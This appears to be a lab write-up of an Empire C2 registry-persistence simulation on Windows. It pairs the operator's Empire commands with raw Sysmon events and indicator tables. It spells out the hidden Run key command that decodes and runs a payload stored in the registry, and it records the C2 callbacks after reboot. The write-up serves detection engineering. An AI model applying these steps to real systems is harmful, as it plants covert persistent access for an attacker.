# Persistence Registry

## Goal 
| Simulation # | Stager Option |
| ------------ | ------------- |
| 1            | usermodule persistence/userland/registry |

## Technical Context
### Assumption
* Attacker is a low-priv user 
* The C2 connection has established 
  
### Simulation 1
This attacker modify the registry to main the persistence in a low-priv environment. And the low-priv user simulate the reboot.


#### Payload Generation
```bash
(Empire: agents) > agents

[*] Active agents:

 Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
 ----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------

 M5N2S3RG ps 192.168.254.47  WIN-40TITGP9BI7   WIN-40TITGP9BI7\victim  powershell         920    1/0.0    2020-12-04 22:47:38  http


(Empire: agents) > interact M5N2S3RG
(Empire: M5N2S3RG) > usemodule persistence/userland/registry
(Empire: powershell/persistence/userland/registry) > set Listener http
(Empire: powershell/persistence/userland/registry) > execute
[>] Module is not opsec safe, run? [y/N] y
[*] Tasked M5N2S3RG to run TASK_CMD_WAIT
[*] Agent M5N2S3RG tasked with task ID 1
[*] Tasked agent M5N2S3RG to run module powershell/persistence/userland/registry
(Empire: powershell/persistence/userland/registry) >
Registry persistence established using listener http stored in HKCU:Software\Microsoft\Windows\CurrentVersion\Debug.
```

#### Attack Begin

1. Execute the persistence module on empire


##### Raw Sysmon Event

User execute the payload 
```xml
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2020-12-04T14:47:35.932657000Z'/><EventRecordID>24216</EventRecordID><Correlation/><Execution ProcessID='956' ThreadID='3828'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-40TITGP9BI7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2020-12-04 14:47:35.927</Data><Data Name='ProcessGuid'>{84453EAB-4C07-5FCA-BDC5-500400000000}</Data><Data Name='ProcessId'>920</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='FileVersion'>6.1.7600.16385 (win7_rtm.090713-1255)</Data><Data Name='Description'>Windows PowerShell</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>PowerShell.EXE</Data><Data Name='CommandLine'>powershell  -noP -sta -w 1 -enc  //5112bytes long payload//</Data><Data Name='CurrentDirectory'>C:\Users\victim\</Data><Data Name='User'>WIN-40TITGP9BI7\victim</Data><Data Name='LogonGuid'>{84453EAB-4AE9-5FCA-D7FA-480400000000}</Data><Data Name='LogonId'>0x448fad7</Data><Data Name='TerminalSessionId'>4</Data><Data Name='IntegrityLevel'>Medium</Data><Data Name='Hashes'>MD5=852D67A27E454BD389FA7F02A8CBE23F,SHA256=A8FDBA9DF15E41B6F5C69C79F66A26A9D48E174F9E7018A371600B866867DAB8,IMPHASH=F2C0E8A5BD10DBC167455484050CD683</Data><Data Name='ParentProcessGuid'>{84453EAB-4C03-5FCA-F9C2-500400000000}</Data><Data Name='ParentProcessId'>3700</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>"C:\Windows\system32\cmd.exe" </Data></EventData></Event>
```

##### Key Indicator

| Field        | Value                                                                                          | Comments |
| ------------ | ---------------------------------------------------------------------------------------------- | -------- |
| EventID      | 1                                                                                              |          |
| process_exec | powershell.exe                                                                                    |          |
| process_id   | 920                                                                                           |          |
| parent_process_id   | 3700                                                                                           |          |
| cmdline      | "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noP -sta -w 1 -enc //5112bytes long payload// |          |

C2 connection has established
```xml
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2020-12-04T14:47:41.676231300Z'/><EventRecordID>24217</EventRecordID><Correlation/><Execution ProcessID='956' ThreadID='2332'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-40TITGP9BI7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2020-12-03 14:15:47.576</Data><Data Name='ProcessGuid'>{84453EAB-4C07-5FCA-BDC5-500400000000}</Data><Data Name='ProcessId'>920</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='User'>WIN-40TITGP9BI7\victim</Data><Data Name='Protocol'>tcp</Data><Data Name='Initiated'>true</Data><Data Name='SourceIsIpv6'>false</Data><Data Name='SourceIp'>192.168.254.47</Data><Data Name='SourceHostname'>WIN-40TITGP9BI7</Data><Data Name='SourcePort'>54232</Data><Data Name='SourcePortName'>-</Data><Data Name='DestinationIsIpv6'>false</Data><Data Name='DestinationIp'>192.168.254.46</Data><Data Name='DestinationHostname'>-</Data><Data Name='DestinationPort'>80</Data><Data Name='DestinationPortName'>http</Data></EventData></Event>
```

##### Key Indicator

| Field             | Value                                                                         | Comments |
| ----------------- | ----------------------------------------------------------------------------- | -------- |
| EventID           | 3                                                                             |          |
| process_exec      | powershell.exe                                                                |          |
| process_id   | 920                                                                                           |          |
| dest_ip           | 192.168.254.46 | my test lab c2                                                     |
| dest_port         | 80             | depends on the empire listener type, in this simulation i set http |

Attacker begin the persistence
```xml
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>13</EventID><Version>2</Version><Level>4</Level><Task>13</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2020-12-04T14:48:48.938191300Z'/><EventRecordID>24226</EventRecordID><Correlation/><Execution ProcessID='956' ThreadID='3828'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-40TITGP9BI7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>T1060,RunKey</Data><Data Name='EventType'>SetValue</Data><Data Name='UtcTime'>2020-12-04 14:48:48.937</Data><Data Name='ProcessGuid'>{84453EAB-4C07-5FCA-BDC5-500400000000}</Data><Data Name='ProcessId'>920</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='TargetObject'>HKU\S-1-5-21-2892772840-4280103526-640991184-1003\Software\Microsoft\Windows\CurrentVersion\Run\Updater</Data><Data Name='Details'>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "$x=$((gp HKCU:Software\Microsoft\Windows\CurrentVersion Debug).Debug);powershell -Win Hidden -enc $x"</Data></EventData></Event>
```

##### Key Indicator

| Field             | Value                                                                         | Comments |
| ----------------- | ----------------------------------------------------------------------------- | -------- |
| EventID           | 13                                                                             |          |
| process_exec      | powershell.exe                                                                |          |
| process_id   | 920                                                                                           |          |
| registry_path           | HKU\S-1-5-21-2892772840-4280103526-640991184-1003\Software\Microsoft\Windows\CurrentVersion\Run\Updater | |
| registry_value_name         | "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "$x=$((gp HKCU:Software\Microsoft\Windows\CurrentVersion Debug).Debug);powershell -Win Hidden -enc $x"| |

After user reboot

```xml
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2020-12-04T15:19:34.180659100Z'/><EventRecordID>25211</EventRecordID><Correlation/><Execution ProcessID='1568' ThreadID='1936'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-40TITGP9BI7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2020-12-04 15:19:34.133</Data><Data Name='ProcessGuid'>{84453EAB-5386-5FCA-95AE-0A0000000000}</Data><Data Name='ProcessId'>3228</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='FileVersion'>6.1.7600.16385 (win7_rtm.090713-1255)</Data><Data Name='Description'>Windows PowerShell</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>PowerShell.EXE</Data><Data Name='CommandLine'>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "$x=$((gp HKCU:Software\Microsoft\Windows\CurrentVersion Debug).Debug);powershell -Win Hidden -enc $x"</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>WIN-40TITGP9BI7\victim</Data><Data Name='LogonGuid'>{84453EAB-5384-5FCA-8C47-0A0000000000}</Data><Data Name='LogonId'>0xa478c</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>Medium</Data><Data Name='Hashes'>MD5=852D67A27E454BD389FA7F02A8CBE23F,SHA256=A8FDBA9DF15E41B6F5C69C79F66A26A9D48E174F9E7018A371600B866867DAB8,IMPHASH=F2C0E8A5BD10DBC167455484050CD683</Data><Data Name='ParentProcessGuid'>{84453EAB-5385-5FCA-0863-0A0000000000}</Data><Data Name='ParentProcessId'>868</Data><Data Name='ParentImage'>C:\Windows\explorer.exe</Data><Data Name='ParentCommandLine'>C:\Windows\Explorer.EXE</Data></EventData></Event>
```
##### Key Indicator

| Field        | Value                                                                                          | Comments |
| ------------ | ---------------------------------------------------------------------------------------------- | -------- |
| EventID      | 1                                                                                              |          |
| process_exec | powershell.exe                                                                                    |          |
| process_id   | 3228                                                                                           |          |
| parent_process_id   | 868                                                                                           |          |
| cmdline      | "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "$x=$((gp HKCU:Software\Microsoft\Windows\CurrentVersion Debug).Debug);powershell -Win Hidden -enc $x" |          |



```xml
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2020-12-04T15:19:36.388822900Z'/><EventRecordID>25212</EventRecordID><Correlation/><Execution ProcessID='1568' ThreadID='1936'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-40TITGP9BI7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2020-12-04 15:19:36.386</Data><Data Name='ProcessGuid'>{84453EAB-5388-5FCA-D8DA-0A0000000000}</Data><Data Name='ProcessId'>3492</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='FileVersion'>6.1.7600.16385 (win7_rtm.090713-1255)</Data><Data Name='Description'>Windows PowerShell</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>PowerShell.EXE</Data><Data Name='CommandLine'>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"  -Win Hidden -enc //5120bytes long payload//</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>WIN-40TITGP9BI7\victim</Data><Data Name='LogonGuid'>{84453EAB-5384-5FCA-8C47-0A0000000000}</Data><Data Name='LogonId'>0xa478c</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>Medium</Data><Data Name='Hashes'>MD5=852D67A27E454BD389FA7F02A8CBE23F,SHA256=A8FDBA9DF15E41B6F5C69C79F66A26A9D48E174F9E7018A371600B866867DAB8,IMPHASH=F2C0E8A5BD10DBC167455484050CD683</Data><Data Name='ParentProcessGuid'>{84453EAB-5386-5FCA-95AE-0A0000000000}</Data><Data Name='ParentProcessId'>3228</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "$x=$((gp HKCU:Software\Microsoft\Windows\CurrentVersion Debug).Debug);powershell -Win Hidden -enc $x"</Data></EventData></Event>
```

##### Key Indicator

| Field        | Value                                                                                          | Comments |
| ------------ | ---------------------------------------------------------------------------------------------- | -------- |
| EventID      | 1                                                                                              |          |
| process_exec | powershell.exe                                                                                    |          |
| process_id   | 3492                                                                                           |          |
| parent_process_id   | 3228                                                                                           |  the explorer.exe when OS boot up |
| cmdline      | "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"  -Win Hidden -enc //5120bytes long payload//|          |


C2 Callback
```xml
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2020-12-04T15:19:41.115550900Z'/><EventRecordID>25217</EventRecordID><Correlation/><Execution ProcessID='1568' ThreadID='1952'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-40TITGP9BI7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2020-12-04 15:19:39.108</Data><Data Name='ProcessGuid'>{84453EAB-5388-5FCA-D8DA-0A0000000000}</Data><Data Name='ProcessId'>3492</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='User'>WIN-40TITGP9BI7\victim</Data><Data Name='Protocol'>tcp</Data><Data Name='Initiated'>true</Data><Data Name='SourceIsIpv6'>false</Data><Data Name='SourceIp'>192.168.254.47</Data><Data Name='SourceHostname'>WIN-40TITGP9BI7</Data><Data Name='SourcePort'>49167</Data><Data Name='SourcePortName'>-</Data><Data Name='DestinationIsIpv6'>false</Data><Data Name='DestinationIp'>192.168.254.46</Data><Data Name='DestinationHostname'>-</Data><Data Name='DestinationPort'>80</Data><Data Name='DestinationPortName'>http</Data></EventData></Event>
```

##### Key Indicator

| Field             | Value                                                                         | Comments |
| ----------------- | ----------------------------------------------------------------------------- | -------- |
| EventID           | 3                                                                             |          |
| process_exec      | powershell.exe                                                                |          |
| process_id   | 3492                                                                                           |          |
| dest_ip           | 192.168.254.46 | my test lab c2                                                     |
| dest_port         | 80             | depends on the empire listener type, in this simulation i set http |
